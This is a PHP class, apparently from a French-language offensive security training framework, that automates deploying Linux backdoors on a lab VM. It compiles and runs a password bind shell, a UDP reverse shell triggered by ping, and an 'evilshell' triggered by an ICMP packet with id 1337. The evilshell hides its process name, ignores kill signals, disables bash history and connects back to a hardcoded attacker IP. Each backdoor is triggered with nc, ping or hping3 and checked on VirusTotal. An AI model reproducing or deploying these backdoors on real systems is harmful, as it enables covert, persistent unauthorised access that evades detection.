<?php 




class trojan4linux extends inject4linux{

  

    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass);
    }
    
    // https://github.com/n1nj4sec/pupy
    // https://github.com/r00tkillah/HORSEPILL
    // http://r00tkit.me/
    // https://kalilinuxtutorials.com/cymothoa/
    // https://blog.barradell-johns.com/index.php/2018/09/04/pinkys-palace-v3-writeup/
    
    public function trojan4linux_password($password){
        $this->ssTitre("Backdoor Bind on $this->target_port with Password access; '$password' " );
        $this->requette("cp -v  $this->dir_c/backdoor_with_password.c $this->dir_tmp/backdoor_with_password.c" );
        $this->requette("gedit $this->dir_tmp/backdoor_with_password.c" );
        $file_c = new FILE("$this->dir_tmp/backdoor_with_password.c");
        $file_elf = $file_c->file_c2elf("");
        $elf = new bin4linux($file_elf);
        //$this->requette("gcc  $this->dir_c/backdoor_with_password.c -o $this->dir_tmp/backdoor_with_password  2>/dev/null" );
        $cmd1 = "$elf->file_path /bin/sh $this->target_port $password ";
        $cmd2 = "echo '$this->root_passwd' | sudo -S nmap -sS -p $this->target_port --reason -v $this->target_ip && nc $this->target_ip $this->target_port -v " ;
        $this->exec_parallel($cmd1, $cmd2, 2);
        $this->pause();
    }
    
    
    public function trojan4linux_ping(){
        $this->ssTitre("Backdoor UDP qui s'active lors d'un ping et se reverse connexion vers l'attaquant sur le port 2323" );
        $this->important("Port 53 UDP -> sortir a travers le firewall" );
        $ub = new vm($this->target_vmx_name);
        $this->requette("cp -v $this->dir_c/victime_backdoor.c $this->dir_tmp/victime_backdoor.c" );
        $this->requette("gedit $this->dir_tmp/victime_backdoor.c" );
        $this->pause();
        $this->cmd($this->target_vmx_name, "nc -ul $this->attacker_port -v" );
        $ub->vm2upload("$this->dir_tmp/victime_backdoor.c", "$this->vm_tmp_lin/victime_backdoor.c");
        $this->cmd($this->target_vmx_name, "gcc -o $this->vm_tmp_lin/victime_backdoor $this->vm_tmp_lin/victime_backdoor.c  2>/dev/null;sudo $this->vm_tmp_lin/victime_backdoor" ); // tools
        $this->cmd("localhost", "ping $this->target_ip -c 1 -s 100" );
        /*
         * alert icmp any any -> any any (icmp_id: 100; msg: "ICMP ID=100";)
         * alert icmp any any -> any any (icmp_seq: 100; msg: "ICMP Sequence=100";)
         */
        
        $this->cmd($this->target_vmx_name, "sudo ps aux | grep victime_backdoor" );
        $this->important("on voit bien le nom du programme dans la liste des processus" );
        $rst = $ub->vm2process_list();
        $this->requette("cat $rst | grep victime_backdoor");
        $this->pause();
        $ub->vm2download("$this->vm_tmp_lin/victime_backdoor", "$this->dir_tmp/victime_backdoor");
        
        $check = new file("$this->dir_tmp/victime_backdoor" );
        $check->file_file2virus2vt();
        $this->pause();
    }
    
    public function trojan4linux_hide_process(){
        $this->titre(__FUNCTION__);
        /*
         * kill -l
         * kill -10 24491
         * kill -12 24491
         */
        
        
        
        
        $ub = new vm($this->target_vmx_name);
        
  
        
        
        $this->ssTitre("un Autre Backdoor: reverse TCP + ICMP type 8 + id=1337 + hide process ...etc" );
        $this->requette("cp -v  $this->dir_c/evilshell.c $this->dir_tmp/evilshell.c" );
        
        
        $this->article("Description", "the backdoor launch the connection to the pc when it recieve the paquet
	ICMP ping with the filled fields like this :
	id 	: 1337
	code 	: 0
	type 	: 8
            
	backdoor remote connect .
	change the name procecus for hide the command ps .
	ignore signal SIGTERM SIGINT SIGQUIT SIGSTOP for don't stop the backdoor .
	redirect stderr in /dev/null for discret .
	create procecus child for execute the evil code .
	need passwd for connect backdoor .
	redirect bash history (HISTFILE) in /dev/null for the new shell .
	redirect stdout , stdin in socket client .
            
	define HIDDEN	\"/usr/sbin/lpinfo\"
	define VAR 	\"HISTFILE=/dev/null\"
	define	IP_DST	\"10.100.10.1\" // Attaquant
	define PORT	8000
	" );
        $this->requette("gedit $this->dir_tmp/evilshell.c" );
        $this->pause();
        
        $this->cmd($this->target_vmx_name, "nc -l $this->attacker_port -v" );
        $this->cmd($this->target_vmx_name, "sudo locate *history* | grep bash" );
        $this->cmd($this->target_vmx_name, "cat /home/$this->user2local/.bash_history | tee -a ./before_hist.old " );
        $this->cmd($this->target_vmx_name, "sudo cat /root/.bash_history | tee -a ./before_hist.old " );
        $rst = $ub->vm2process_list();
        $this->requette("cat $rst | grep lpinfo");
        $ub->vm2upload("$this->dir_tmp/evilshell.c", "$this->vm_tmp_lin/evilshell.c");
        
        $this->cmd($this->target_vmx_name, "cd $this->vm_tmp_lin/ ; gcc -o evilshell evilshell.c  2>/dev/null; sudo ./evilshell" );
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S hping3 -I $this->eth_lan -c 1 --icmptype 8 --icmp-ipid 1337 $this->target_ip" );
        $this->pause();
        $ub->vm2download("$this->vm_tmp_lin/evilshell", "$this->dir_tmp/evilshell");
        $this->pause();
        $check = new file("$this->dir_tmp/evilshell" );
        $check->file_file2virus2vt();
        $this->pause();
        $rst = $ub->vm2process_list();
        $this->requette("cat $rst | grep evilshell");
        $rst = $ub->vm2process_list();
        $this->requette("cat $rst | grep lpinfo");
        $this->pause();
        $this->cmd($this->target_vmx_name, "cat /home/$this->user2local/.bash_history | tee -a ./after_hist.old " );
        $this->cmd($this->target_vmx_name, "sudo cat /root/.bash_history | tee -a ./after_hist.old " );
        $this->cmd($this->target_vmx_name, "cmp ./before_hist.old ./after_hist.old" );
        $this->pause();
        
        
        
    }
    
    
}
?>